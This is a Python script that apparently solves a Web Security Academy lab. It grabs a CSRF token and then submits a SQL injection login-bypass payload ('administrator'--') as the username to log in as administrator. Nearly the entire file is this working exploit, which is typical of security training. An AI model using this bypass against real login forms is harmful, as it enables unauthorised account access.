#!/usr/bin/env python3 

import requests
import urllib3
import argparse
import subprocess
from bs4 import BeautifulSoup
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""SQL Injection Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "administrator'--" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "administrator'--" 

""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-c', '--command', help='Command to run, Example: administrator\'--', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
command = args.command
s = requests.Session()

def get_csrf(s, url):
    path = '/login'
    r = s.get(url + path, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    global csrf
    csrf = soup.find("input")['value']
    return csrf

def sqli(url, command, csrf):
    path = '/login'
    data = {
        'csrf': csrf,
        'username': command,
        'password': 'test'
    }
    if args.proxy:
        args.proxy=str(args.proxy)
        proxies = {
            'http': 'http://' + args.proxy,
            'https': 'http://' + args.proxy,
        }
        s.post(url + path, data=data, verify=False, proxies=proxies)
    else:
        s.post(url + path, data=data, verify=False)
        r = s.get(url + '/my-account', verify=False)
        # verify the response contains Congratulations, you solved the lab!
        if (b'Congratulations, you solved the lab!' in r.content):
            print("(+) SQL Injection Successful!")
            subprocess.call(["firefox", url])
        else:
            print("(-) SQL Injection Failed")

def main():
    
    print("(+) Exploiting SQL Injection")
        
    get_csrf(s, url)

    sqli(url, command, csrf)

if __name__ == "__main__":
    main()
